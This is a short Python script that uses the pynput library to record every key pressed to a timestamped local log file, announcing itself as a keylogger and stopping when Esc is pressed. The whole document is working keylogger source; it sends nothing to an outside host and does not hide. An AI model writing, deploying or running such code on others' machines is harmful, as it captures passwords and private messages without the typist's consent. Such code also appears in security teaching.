from pynput import keyboard
import logging
from datetime import datetime

# Output log file with timestamp
log_filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

print(f"[+] Keylogger started... Logging to: {log_filename}")

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on 'Esc' key
        print("[!] Escape pressed. Exiting keylogger.")
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
